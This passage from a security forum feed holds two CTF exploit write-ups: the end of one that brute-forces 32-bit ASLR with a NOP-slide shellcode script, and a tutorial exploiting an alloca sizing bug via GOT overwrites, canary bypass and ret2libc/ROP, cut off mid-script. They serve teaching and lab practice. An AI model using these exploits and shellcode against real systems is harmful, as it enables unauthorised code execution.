<p>R - read permissions</p>
<p>X - execute permissions</p>
<p>The W (write) permission is disabled.</p>
<p>This means that if we attempt to rewrite an instruction in the code section, we will receive a segfault and the program will crash.</p>
<p>I banged my head on this program for a couple of hours, trying different methods of jumping to instructions but i couldn’t find a way to get to the stack successfully.</p>
<p>What shall a young exploiter do next?</p>
<h2>ASLR in 32-bit</h2>
<p>I started reading about ASLR implementation on 32bit systems (remember, our binary is 32-bit )</p>
<p>And i found the following explanation:</p>
<p>“For 32-bit, there are 2^32 (4 294 967 296) theoretical addresses, nevertheless, the kernel will allow to control about only half of bits (2^(32/2) = 65 536) for an execution in a virtualized memory”.</p>
<p>This means that the stack size can randomized just up to 65,536 bytes.</p>
<p>If we can can control tens of thousands of shellcode bytes then we might can try to jmp to a constant address on the stack and have a good probability of success</p>
<p>I checked whether it was possible to send lots of parameters with long strings</p>
<pre><code class="lang-auto">
from pwnlib.tubes.process import *

for i in range(600):


    argv.append("a"*1024)

argv_program=process(argv=["awdawd"], executable="/home/user/test_argv")

print argv_program.recv()

</code></pre>
<p><strong><img src="/uploads/default/original/2X/2/22a128d23236a26d19c88a5f4610a20f0462c6c3.png" alt="" data-base62-sha1="4Wlw1zZoYEmcSc7Nalkrqk4sVJp" width="384" height="75"></strong></p>
<p>We sent in this example, 6014400 bytes to our program and run succesfully</p>
<p>Let’s make a slide!</p>
<p>A NOP slide !</p>
<p><strong><img src="/uploads/default/original/2X/e/e6f58b5d79ff8ac4a567058cb634b591c23aafc1.png" alt="" data-base62-sha1="wX9Tt0Bhnbz1bvRzt4cxwKDzQsh" width="404" height="358"></strong></p>
<p>We can send our parameters filled with nops and our shellcode at the end.</p>
<p>That way, we can jump to a random address on the stack and hopefully we will be able to land on one of our nop instructions and we will slide the whole way to our shellcode.</p>
<p>I made the following code that executes the program</p>
<p>With our payload and attempts to jump to a constant address on the stack</p>
<p>0xffb05544</p>
<p>This address was chosen for both reasons:</p>
<p>1.In this program i noticed after many executions with gdb that this address is most of the time in the range of the stack or very close to it</p>
<p>2.we needed an address without any null bytes in it because otherwise we would get</p>
<p>An the following error:</p>
<p>“Inappropriate nulls in argv[0]:”</p>
<p>So i wrote the following code:</p>
<pre><code class="lang-auto">
import struct

import random

from pwnlib.tubes.process import *

from pwnlib.exception import *

import pwnlib

# Taken from http://shell-storm.org/shellcode/files/shellcode-811.php

# execve('/bin/sh')

EXECV = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

def build_shellcode(address):


    """


    Build shellcode


    address - address to jump to


    """ 


    args = []


    args.append(address)


    shellcode =   "\x90"*8000 + EXECV


    for i in range(120):


        args.append(shellcode)


    return args


     

if __name__ == "__main__":


    jump_address = struct.pack("I", 0xffb05544)


    for i in range(10000000):


        try:


            prog_args = build_shellcode(jump_address)


            	print "attempt number: {}".format(i + 1 )


            pro = process(argv=prog_args,


                env={}, 


                executable="/home/user/CTFs/Pwnables/tiny_easy/tiny_easy")


            print "started_running address {}".format(hex(struct.unpack("I",jump_address)[0]))


            pro.timeout=0.08


            # Send command shell of the process


            pro.sendline("echo we_made_it!")


            # Recv the result of the command execution  


            data = pro.recvline()


            if data:


                print "received data!"


                print data


                break


        except (EOFError, pwnlib.exception.PwnlibException) as e:


            print e

</code></pre>
<p>This code attempts to run the tiny_easy binary and jump to our shellcode which opens a shell. If we succeed then we will be able to send the command</p>
<p>“echo we_made_it” and see it’s output</p>
<p>Lets try it out</p>
<p><strong><img src="/uploads/default/original/2X/d/dc9b1caaab4aa0f2117f8865a88a825cd17096f6.png" alt="" data-base62-sha1="vtzmTTY7FVvmiioDyW7Abcy2buS" width="486" height="215"></strong></p>
<p><strong><img src="/uploads/default/original/2X/d/dc9b1caaab4aa0f2117f8865a88a825cd17096f6.png" alt="" data-base62-sha1="vtzmTTY7FVvmiioDyW7Abcy2buS" width="486" height="215"></strong></p>
<p>It worked!</p>
<p>It seems that our nop slide did it’s job successfully, now let’s check it out on the CTF server itself.</p>
<p>Notice that we need to change the command we wish to execute from</p>
<p>“echo we_made_it” to “cat /home/tiny_easy/flag” In order to get the flag.</p>
<p>We can upload our script to the server’s tmp directory easily using the “scp” command like this:</p>
<pre><code class="lang-auto">
scp -P 2222 ./pwn_tiny.py tiny_easy@pwnable.kr:/tmp/pwn_tiny.py

</code></pre>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485.png" data-download-href="/uploads/short-url/ukXhf8Iewj9bcpFdw0ZeifpxzZb.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485_2_372x499.png" alt="" data-base62-sha1="ukXhf8Iewj9bcpFdw0ZeifpxzZb" width="372" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485_2_372x499.png, /uploads/default/original/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485.png 1.5x, /uploads/default/original/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485_2_10x10.png"></a></strong></div><p></p>
<p>And there is our flag <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<hr>
<h1>Conclusions</h1>
<p>In this article, we discussed exploit development by using a CTF example,<br>
we learned about how inputs are received by the program from argv and argc.<br>
Finally, saw how ASLR in 32-bit systems is vulnerable due to small randomization ranges and how to utilize this flaw to perform an attack that is statistically very plausible.</p>
<p>I hope you all enjoyed my first post and i’ll see you all next time!</p>
<p><strong>Sources</strong></p>
<p><strong><a href="https://hacked0x90.wordpress.com/2016/10/30/bypassing-aslr-protection-using-brute-force/" rel="noopener nofollow ugc">Bypassing ASLR Protection using Brute Force</a></strong></p>
<p><strong><a href="https://pwnable.kr/" rel="noopener nofollow ugc">Pwnable.kr</a></strong></p>
            <p><small>10 posts - 8 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/exploit-development-the-magic-in-hacking/20349">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/exploit-development-the-magic-in-hacking/20349</link>
          <pubDate>Wed, 08 Apr 2020 13:01:42 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20349</guid>
          <source url="https://d.clarkee.co.uk/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
        </item>
        <item>
          <title>Punishing code with magic numbers with ROP and ret2libc on an x86_64</title>
          <dc:creator><![CDATA[GnikDroy]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1><a name="p-54170-punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86_64-1" class="anchor" href="https://d.clarkee.co.uk#p-54170-punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86_64-1"></a>Punishing code with magic numbers with ROP and ret2libc on an x86_64</h1>
<p><strong>Difficulty: Beginner</strong></p>
<p><strong>CTF: /zer0pts/pwn/protude</strong> (ASLR is enabled here)</p>
<h2><a name="p-54170-the-vulnerable-program-2" class="anchor" href="https://d.clarkee.co.uk#p-54170-the-vulnerable-program-2"></a>The vulnerable program</h2>
<p>This program takes an integer <code>N</code> and <code>N</code> other integers as input. Then it calculates and prints the sum of these numbers.<br>
A pretty standard exercise when you are learning a new programming language.</p>
<p>We are going to attempt to exploit it get RCE. Take a few moments to absorb the code before moving on.</p>
<pre data-code-wrap="C"><code class="lang-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

long n;

long read_long() {
  char buf[32];
  int readByte;
  memset(buf, 0, sizeof(buf));          // sets memory to 0
  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
  if (readByte == 0) {
    puts("[ERROR] read failed");        // no bytes read = exit()
    exit(1);
  }
  return atol(buf);                     // convert input to long
}

void setup() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
}

void calc_sum(void) {
  long i;
  long *array;
  long result;
  
  array = (long*)alloca(n * 4);       

  for(i = 0; 0 &lt;= i &amp;&amp; i &lt; n; i++) {
    printf("num[%ld] = ", i + 1);
    array[i] = read_long();
  }

  for(result = 0, i = 0; i &lt; n; i++) {
    result += array[i];
  }

  printf("SUM = %ld\n", result);
}

int main() {
  setup();
    
  printf("n = ");
  n = read_long();
  if (n &lt;= 0x00 || n &gt; 22) { // size has to be 1-22
    puts("Invalid input");
  } else {
    calc_sum();
  }
  return 0;
}
</code></pre>
<h2><a name="p-54170-setup-3" class="anchor" href="https://d.clarkee.co.uk#p-54170-setup-3"></a>Setup</h2>
<p>Let’s set up a few things before we start:</p>
<ul>
<li>Disable ASLR<pre data-code-wrap="bash"><code class="lang-bash">echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre>
</li>
<li>Disable PIE (during compilation)</li>
<li>Enable DEP (during compilation)</li>
<li>Enable stack protector (during compilation)</li>
</ul>
<p>The binary is provided to you <a href="http://s000.tinyupload.com/index.php?file_id=45318469853655576559" rel="noopener nofollow ugc">here</a>.</p>
<h2><a name="p-54170-static-analysis-4" class="anchor" href="https://d.clarkee.co.uk#p-54170-static-analysis-4"></a>Static Analysis</h2>
<h3><a name="p-54170-inspecting-code-that-handles-user-input-5" class="anchor" href="https://d.clarkee.co.uk#p-54170-inspecting-code-that-handles-user-input-5"></a>Inspecting code that handles user input.</h3>
<p>Let’s take a closer look at the user input function.</p>
<pre data-code-wrap="c"><code class="lang-c">long read_long() {
  char buf[32];
  int readByte;
  memset(buf, 0, sizeof(buf));          // sets memory to 0
  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
  if (readByte == 0) {
    puts("[ERROR] read failed");        // no bytes read = exit()
    exit(1);
  }
  return atol(buf);                     // convert input to long
}
</code></pre>
<p>We have a buffer of 32 bytes. <code>read(0, buf, sizeof(buf))</code> reads <strong>at most</strong> 32 characters. Therefore, there is <strong>no way to overwrite the stack using read.</strong> : (</p>
<p>We have an interesting call to <code>atol(buf)</code> at the end, but we cannot get anything out of it. The function will simply return <code>0</code> on any suspicious input.</p>
<p>Although the function implementation uses bad practices, we don’t have anything interesting going on.</p>
<h3><a name="p-54170-inspecting-the-function-that-calculates-the-sum-6" class="anchor" href="https://d.clarkee.co.uk#p-54170-inspecting-the-function-that-calculates-the-sum-6"></a>Inspecting the function that calculates the sum.</h3>
<pre data-code-wrap="C"><code class="lang-C">void calc_sum(void) {
  long i;
  long *array;
  long result;
  
  array = (long*)alloca(n * 4);       

  for(i = 0; 0 &lt;= i &amp;&amp; i &lt; n; i++) {
    printf("num[%ld] = ", i + 1);
    array[i] = read_long();
  }

  for(result = 0, i = 0; i &lt; n; i++) {
    result += array[i];
  }

  printf("SUM = %ld\n", result);
}

</code></pre>
<p>If you are unfamiliar with <code>alloca</code>, <code>man 3 alloca</code> to check the manual page for it.</p>
<blockquote>
<p>The alloca()  function allocates size bytes of space in the stack frame of the caller.  This temporary space  is  automatically  freed  when the function that called alloca() returns to its caller</p>
</blockquote>
<p><code>alloca</code> allocates memory <strong>in the stack frame of the caller</strong>, in this case, <code>calc_sum</code>.</p>
<p><strong>This is an interesting choice.</strong> Usually, people use <code>malloc</code> to allocate space at runtime. But in this case, since <code>n</code> is bound to 1-22, it is not too bad. Too much stack space is <strong>not</strong> used.</p>
<p>Then, N integers that are read from <code>read_long()</code> are placed in the memory we allocated.<br>
The sum is calculated and the result is printed. Not too much going here as well.</p>
<p><strong>If you want to figure out the vulnerability on your own, stop here.</strong></p>
<h2><a name="p-54170-introducing-magic-numbers-7" class="anchor" href="https://d.clarkee.co.uk#p-54170-introducing-magic-numbers-7"></a>Introducing magic numbers</h2>
<blockquote>
<p>The term <a href="https://en.wikipedia.org/wiki/Magic_number_(programming)" rel="noopener nofollow ugc">magic number</a> or magic constant refers to the anti-pattern of using numbers directly in source code</p>
</blockquote>
<p>The use of magic numbers is often frowned upon. They make your code difficult to understand and often introduce subtle bugs.</p>
<p>Take a look at the following piece of code from Wikipedia.</p>
<pre data-code-wrap="C"><code class="lang-C">   for i from 1 to 52
       j := i + randomInt(53 - i) - 1
       a.swapEntries(i, j)
</code></pre>
<p>52 and 53 (and most other numbers which has no meaning in local context) is a magic number.<br>
In this above case, the only problem this poses is a slight annoyance over the mysterious 52. Cases like the following, however, may create portability issues.</p>
<pre data-code-wrap="c"><code class="lang-c">const int array_size = 20;
int *ptr = (int*) malloc(array_size * 4);
</code></pre>
<p>Here, 4 is the magic number. The peice of code above executes properly in systems where the <code>sizeof (int) == 4</code>. But if it is 2, it breaks miserably when we attempt to use <code>ptr</code>.</p>
<p>If we were to write this properly, we would use something like.</p>
<pre data-code-wrap="c"><code class="lang-c">const int array_size = 20;
int *ptr = (int*) malloc(array_size * sizeof (int));
</code></pre>
<p>Okay, now you are equipped with the knowledge of magic numbers! Let us approach this problem again.</p>
<h2><a name="p-54170-finding-an-arbitrary-write-8" class="anchor" href="https://d.clarkee.co.uk#p-54170-finding-an-arbitrary-write-8"></a>Finding an arbitrary write.</h2>
<p>Take a look at:</p>
<pre data-code-wrap="c"><code class="lang-c">  array = (long*) alloca(n * 4);       
</code></pre>
<p>This is the exact portability issue that we discussed earlier.<br>
Only <code>sizeof(char)</code> is fixed as 1 by the C standard. Everything else usually only has minimum size requirements. The compiler can choose whatever size it sees is the best.<br>
Usually, in x86_64 compilers make the <code>sizeof(long) == 8</code>. This is convenient because a <code>long</code> will fit in a register.</p>
<p><strong>In this case, sizeof(long) == 8</strong></p>
<p>So we have allocated space like <code>alloca(n * 4);</code> yet the <code>sizeof(long) == 8</code> (In x86_64, this is usually the case).</p>
<p>Therefore, we are only allocating enough memory for <code>n/2</code> longs. Yet, we access all <code>n</code> of them. We are accessing memory not allocated for us! Also, <strong>we can write to that memory.</strong></p>
<p>Even more convenient is the fact that <code>alloca</code>  was used. The extra memory we are addressing is on the stack.</p>
<p>The stack frame will usually look like this for the <code>calc_sum</code> function.</p>
<pre><code class="lang-auto">-----------------------------------------
|      Arguments to the function        |
-----------------------------------------
|           Return Address              |
-----------------------------------------
|      Local variables of calc_sum      |
-----------------------------------------
|          Alloca(n*4) buffer           |
-----------------------------------------
</code></pre>
<p>We can potentially overwrite the local variable <code>array</code> to achieve arbitrary write!</p>
<h2><a name="p-54170-exploiting-the-arbitrary-write-once-9" class="anchor" href="https://d.clarkee.co.uk#p-54170-exploiting-the-arbitrary-write-once-9"></a>Exploiting the arbitrary write once.</h2>
<p>Let’s fire up gdb:</p>
<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ r
n = 21
num[1] = 
num[2] = 
num[3] = 
num[4] = 
... 
num[15] = 
num[2] = 
</code></pre>
<p>We use n = 21. <em>Note that n is restricted to 1-22 (re-read the code if you are confused).</em></p>
<p>I just pass it empty strings so that <code>num[1]</code> through <code>num[15]</code> will be equal to 0.</p>
<p>We notice that after <code>num[15]</code>, we loop back to <code>num[2]</code>.<br>
We have overwritten the local variable <code>i</code>!</p>
<p>Since we have overwritten the local variable <code>i</code> with 0, we again start the loop from 2. (i++ is done at the end and printf() uses i+1).</p>
<p>We are looping indefinitely.</p>
<p>But, looping indefinitely is not useful to us.<br>
To write to memory beyond this, we override the <code>i</code> with 14 (exactly the current index).<br>
So that in the next iteration we get to <code>num[16]</code>.</p>
<pre data-code-wrap="C"><code class="lang-C">gdb-peda$ r
n = 21
num[1] = 
...
num[15] = 14
num[16] = 
</code></pre>
<p>We can now write past the limit and override <code>*array</code> in the next iteration! Then write to <code>*(array+n)</code> in the iteration after that!. That means since we control <code>array</code> we can write to anywhere we wish.</p>
<p>Let’s try to override the <code>printf</code>’s <a href="https://en.wikipedia.org/wiki/Global_Offset_Table" rel="noopener nofollow ugc">GOT</a> entry to point to the <code>puts()</code> call in the code to test things.</p>
<p>First, we get the GOT entry of <code>printf</code>.</p>
<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ x/i printf
   0x400690 &lt;printf@plt&gt;:
    jmp    QWORD PTR [rip+0x20099a]        #0x601030

</code></pre>
<p><code>0x601030</code> is the GOT offset of printf</p>
<p>We then get the location where the <code>puts</code> call is made.</p>
<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ disass read_long
Dump of assembler code for function read_long:
   0x00000000004007c7 &lt;+0&gt;:     push   rbp
   0x00000000004007c8 &lt;+1&gt;:     mov    rbp,rsp
   ...
   0x0000000000400813 &lt;+76&gt;:    lea    rdi,[rip+0x28a]        # 0x400aa4
   0x000000000040081a &lt;+83&gt;:    call   0x400660 &lt;puts@plt&gt;
   ...
   End of assembler dump.
</code></pre>
<p><code>0x000000000040081a</code> is the place we want the GOT offset to point to.</p>
<p>So we override the value at <code>0x601030</code> with <code>0x000000000040081a</code></p>
<pre data-code-wrap="C"><code class="lang-C">gdb-peda$ r
n = 21
num[1] =
...
num[15] = 14
num[16] = 
num[17] = 6295464
num[18] = 4196378
num[%ld] = 
[Inferior 1 (process 16567) exited with code 01]

</code></pre>
<p>As you can see, <code>num[%ld] = </code> was printed without formatting. Awesome.<br>
<code>printf@plt</code> jumped to <code>call puts@plt</code> (and the <code>call exit@plt</code> next).</p>
<p><strong>But wait a minute…</strong><br>
The careful reader might have noticed,<br>
<code>0x601030 = 6295600</code><br>
But we have used, <code>6295464</code> in gdb which is <code>0x601030 - 17*8</code></p>
<p><strong>Why so?</strong><br>
This is because in the next iteration we override the value at <code>array[17]</code> not <code>array[0]</code> therefore we correct the address by subtracting with <code>17 * sizeof(long)</code></p>
<p>With this, we have achieved arbitrary write!!</p>
<p>As of right now, we can only overwrite to memory once. But, it is still a step in the right direction.</p>
<h2><a name="p-54170-overwriting-to-memory-more-than-once-10" class="anchor" href="https://d.clarkee.co.uk#p-54170-overwriting-to-memory-more-than-once-10"></a>Overwriting to memory more than once.</h2>
<p>In order to overwrite to arbitrary memory more than once, we need to find a way to jump to the top of the <code>calc_sum()</code> function whenever we want.<br>
We will do this with a GOT entry overwrite.</p>
<p>Take a look at the following code from <code>read_long</code>.</p>
<pre data-code-wrap="c"><code class="lang-c">  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
  if (readByte == 0) {
    puts("[ERROR] read failed");        // no bytes read = exit()
    exit(1);
  }
</code></pre>
<p>Bring up the man page of <code>read</code>: <code>man 2 read</code>.</p>
<blockquote>
<p>On success, the number of bytes read is  returned  (zero  indicates the end  of file)</p>
</blockquote>
<p>The if block only executes when we provide EOF to the input stream. If we overwrite either the <code>puts</code> or the <code>exit</code> GOT entry to point to the top of the <code>calc_sum</code> function, we can send an EOF to jump to the top of the function. This will allow us to overwrite regions of memory multiple times.</p>
<p>The relevant info:</p>
<pre data-code-wrap="c"><code class="lang-c">calc_sum = 0x40088e = 4196494
puts@got = 0x601018 
</code></pre>
<p>Again, we need to overwrite the correct address so we correct the address <code>0x601018</code> so that <code>array[17]</code> will point to <code>0x601018</code></p>
<pre data-code-wrap="C"><code class="lang-C">0x601018 - 17*8 = 6295440
</code></pre>
<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ r
n = 21
num[1] = 
...
num[15] = 14
num[16] = 
num[17] = 6295440
num[18] = 4196494
num[19] = num[1] = 
</code></pre>
<p>I used <code>CTRL + D</code> to send a EOF to the terminal. We can see the output <code>num[1]</code>. We jumped to the start of the <code>calc_sum</code> again!<br>
We can use this to overwrite to memory any number of times.</p>
<h2><a name="p-54170-rop-and-ret2libc-11" class="anchor" href="https://d.clarkee.co.uk#p-54170-rop-and-ret2libc-11"></a>ROP and ret2libc</h2>
<p>In this challenge, we have DEP and stack cookies that protect executing stack space and checking if the stack frame has been overwritten.</p>
<p>Most of the time, we <strong>do not have</strong> a space in a process that is both <strong>writable and executable</strong>.<br>
For instance let’s check for our current executable.</p>
<pre data-code-wrap="c"><code class="lang-c">[gnik@tinybot ~/]$ ./thebinary &amp;
n =                                 
[gnik@tinybot ~/]$ ps aux | grep thebinary
gnik     16890  0.0  0.0  10696  1040 pts/1    t    16:01   0:00 /home/gnik/thebinary
[gnik@tinybot ~/]$ pmap 16890
16890:   /home/gnik/thebinary
0000000000400000      4K r-x-- thebinary
0000000000600000      4K r---- thebinary
0000000000601000      4K rw--- thebinary
00007ffff73ba000    104K r-x-- libpthread-2.27.so
00007ffff73d4000   2044K ----- libpthread-2.27.so
00007ffff75d3000      4K r---- libpthread-2.27.so
00007ffff75d4000      4K rw--- libpthread-2.27.so
00007ffff75d5000     16K rw---   [ anon ]
00007ffff75d9000     12K r-x-- libdl-2.27.so
00007ffff75dc000   2044K ----- libdl-2.27.so
00007ffff77db000      4K r---- libdl-2.27.so
00007ffff77dc000      4K rw--- libdl-2.27.so
00007ffff77dd000   1948K r-x-- libc-2.27.so
00007ffff79c4000   2048K ----- libc-2.27.so
00007ffff7bc4000     16K r---- libc-2.27.so
00007ffff7bc8000      8K rw--- libc-2.27.so
00007ffff7bca000     16K rw---   [ anon ]
00007ffff7bce000     24K r-x-- libgtk3-nocsd.so.0
00007ffff7bd4000   2044K ----- libgtk3-nocsd.so.0
00007ffff7dd3000      4K r---- libgtk3-nocsd.so.0
00007ffff7dd4000      4K rw--- libgtk3-nocsd.so.0
00007ffff7dd5000    156K r-x-- ld-2.27.so
00007ffff7fbe000     16K rw---   [ anon ]
00007ffff7ff7000     12K r----   [ anon ]
00007ffff7ffa000      8K r-x--   [ anon ]
00007ffff7ffc000      4K r---- ld-2.27.so
00007ffff7ffd000      4K rw--- ld-2.27.so
00007ffff7ffe000      4K rw---   [ anon ]
00007ffffffde000    132K rw---   [ stack ]
ffffffffff600000      4K r-x--   [ anon ]
 total            10700K

</code></pre>
<p>As you can see, <strong>none of them have both the write and execute bit set</strong>.</p>
<p>This is a pretty common security measure, so we cannot write shellcode to a certain memory region and jump to it.</p>
<p>This is where <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" rel="noopener nofollow ugc">ret2libc</a> and <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" rel="noopener nofollow ugc">ROP</a> come into play.</p>
<p>With <strong>ret2libc</strong> we are jumping to certain points in the libc library that is loaded at runtime. For instance, we can jump to potentially dangerous places like <code>system()</code> which is present in <code>libc</code>.</p>
<p>With <strong>ROP</strong> we jump to small code segments in the address space of the process that does a certain task before jumping to a different segment. Chaining a bunch of these ROP <em>gadgets</em> can hence be very powerful.</p>
<p>Our plan to achieve RCE is as follows:</p>
<ul>
<li>Find the address of system() in libc</li>
<li>Find the address of the string '/bin/sh/` lin libc</li>
<li>Find a ROP gadget that can place the address of the <code>/bin/sh</code> string in the rdi register.</li>
<li>Jump to system()</li>
</ul>
<p>Finding the address of system() and the string ‘/bin/sh’ is pretty straight forward.</p>
<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ start
....
Temporary breakpoint 1, 0x00000000004009bd in main ()
gdb-peda$ p system
$1 = {int (const char *)} 0x7ffff782c440 &lt;__libc_system&gt;
</code></pre>
<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ info proc map
process 17653
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      .......
      .......
      0x7ffff77dd000     0x7ffff79c4000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff79c4000     0x7ffff7bc4000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bc4000     0x7ffff7bc8000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bc8000     0x7ffff7bca000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bca000     0x7ffff7bce000     0x4000        0x0 
      0x7ffff7bce000     0x7ffff7bd4000     0x6000        0x0 /usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
      .......
      .......
gdb-peda$ find  '/bin/sh' 0x7ffff77dd000 0x7ffff79c4000
Searching for '/bin/sh' in range: 0x7ffff77dd000 - 0x7ffff79c4000
Found 1 results, display max 1 items:
libc : 0x7ffff7990e9a --&gt; 0x68732f6e69622f ('/bin/sh')
</code></pre>
<p><strong>The system() function is present in <code>0x7ffff782c440</code></strong><br>
<strong>Address of the string ‘/bin/sh’ is <code>0x7ffff7990e9a</code></strong></p>
<p><strong>These addresses are most likely different for your machine</strong></p>
<h2><a name="p-54170-learning-to-write-exploit-scripts-12" class="anchor" href="https://d.clarkee.co.uk#p-54170-learning-to-write-exploit-scripts-12"></a>Learning to write exploit scripts.</h2>
<p><strong>Sufficient knowledge of python is assumed, although not necessary to understand this section.</strong></p>
<p>There are a lot of ways to write your exploit scripts.<br>
I will keep things simple and write one in using <code>python3</code> and <a href="http://docs.pwntools.com/en/stable/" rel="noopener nofollow ugc">pwntools</a></p>
<p>We will do everything we have done so far with gdb in python.</p>
<p>Create a new python script.</p>
<pre data-code-wrap="py"><code class="lang-py">import pwn
import tty
</code></pre>
<p>You can install <code>pwntools</code> with pip and <code>import pwn</code> to work with it. We will also be using some constants from <code>tty</code></p>
<pre data-code-wrap="py"><code class="lang-py">p = pwn.process('./thebinary', stdin=pwn.PTY, raw = False)

# g = pwn.gdb.attach(p, """
# """)
</code></pre>
<p>This is how you start a local process in <code>pwntools</code>. <strong>Note the <code>raw = False</code> and <code>stdin=pwn.PTY</code>!</strong><br>
These options are essential to our current project since we write EOF to stream and not close our stream. (Yes this sounds weird, but this is necessary.)<br>
You can experiment with attaching the debugger by uncommenting some lines here.</p>
<pre data-code-wrap="py"><code class="lang-py">def setup():
    p.sendline('21')

def write_junk(count):
    for x in range(count):
        p.sendline('')

def overwrite_memory(addr, data):
    p.sendline('14')
    p.sendline('')
    p.sendline(str(addr))
    p.sendline(str(data))


def send_eof():
    """
    Note Send EOF sends 2 bytes!!!
    """
    p.sendline(chr(tty.CEOF))
</code></pre>
<p>These are some of the functions that will be useful to us. The functions are self-explanatory. If you have never written an exploit before with pwntools, feel free to experiment here. <code>p.sendline()</code> is used to send a line to the process.</p>
<pre data-code-wrap="py"><code class="lang-py">
setup()
"""
Overwrite the GOT of puts for the ability to write memory many times
"""
write_junk(14)
# 0x40088e = calc_sum
# 0x601018 = GOT of puts
# Overwrite GOT of puts with calc_sum
overwrite_memory(0x601018 - 17*8, 0x40088e)
send_eof()

p.interactive()
</code></pre>
<p>Okay, so now that all that is over, we will first overwrite the GOT entry of <code>puts</code> with <code>calc_sum</code> so that we can use EOF to jump to it again. Our nifty little <code>overwrite_memory()</code> function makes this easier.</p>
<p>The <code>p.interactive()</code> at the end is used to make the process interactive. After this, you can use the terminal for IO.</p>
<p>I recommend you experiment with the script.</p>
<h2><a name="p-54170-things-that-are-necessary-for-the-exploit-to-work-13" class="anchor" href="https://d.clarkee.co.uk#p-54170-things-that-are-necessary-for-the-exploit-to-work-13"></a>Things that are necessary for the exploit to work.</h2>
<p>These are some things that will be useful to us as we move on to ROP.</p>
<ol>
<li>Overwrite the GOT entry of <code>__stack_chk_fail</code> to point to the <code>leaveq; ret</code> instruction in <code>calc_sum</code> to bypass stack smashing check.</li>
<li>Overwrite the value of n to 30 so that we can overwrite more memory at once. (This is used in the ROP step later)</li>
</ol>
<p>I will not show this in gdb since I have already shown you how to overwrite arbitrary memory, and the writeup will be pretty repetitive if I include this.</p>
<p>If you are confused, please refer to the code snippet below from the exploit script.</p>
<pre data-code-wrap="py"><code class="lang-py">"""
Overwrite the GOT of __stack_chk_fail for beating the stack cookie
"""
write_junk(13)
# 0x601020 = GOT of __stack_chk_fail
# 0x4009b3 = leaveq retq instruction in calc_sum, essentially beating the stack_chk_fail
overwrite_memory(0x601020 - 17*8, 0x4009b3)
send_eof()

"""
Overwrite global n to overwrite more data on the stack
"""
write_junk(13)
# n = 0x6010b0
# Overwrite n with 30
overwrite_memory(0x6010b0 - 17*8, 30)
send_eof()

</code></pre>
<h2><a name="p-54170-finding-the-necessary-rop-gadgets-14" class="anchor" href="https://d.clarkee.co.uk#p-54170-finding-the-necessary-rop-gadgets-14"></a>Finding the necessary ROP gadgets</h2>
<p>I use <a href="https://github.com/JonathanSalwan/ROPgadget" rel="noopener nofollow ugc">ROPgadget</a> tool to find the necessary ROP gadgets from the executable. You can use the plethora of alternatives available to you. (gdb-peda also has one!)</p>
<pre><code class="lang-auto">[gnik@tinybot ~/]$ 
ROPgadget --binary thebinary 
...
0x0000000000400a83 : pop rdi ; ret
...
0x0000000000400646 : ret
...

Unique gadgets found: 112

</code></pre>
<p>We will need two ROP gadgets, <code>pop rdi; ret</code> and <code>ret</code>.<br>
<code>pop rdi; ret</code> to load the address of the string into the <code>rdi</code> register and then <code>ret</code> gadget to align the stack address for the <code>movqs</code> instruction. (The reason this is necessary is left as an exercise.)</p>
<h2><a name="p-54170-writing-the-final-exploit-script-15" class="anchor" href="https://d.clarkee.co.uk#p-54170-writing-the-final-exploit-script-15"></a>Writing the final exploit script.</h2>
<p>We finally have all the tools that we need to write a final exploit script.</p>
<p>The final exploit script looks something like.</p>
<pre data-code-wrap="py"><code class="lang-py">import pwn
import tty

p = pwn.process('./thebinary', stdin=pwn.PTY, raw = False)

#g = pwn.gdb.attach(p, """
#b *0x00000000004009b8
#c
#""")

def setup():
    p.sendline('21')

def write_junk(count):
    for x in range(count):
        p.sendline('')

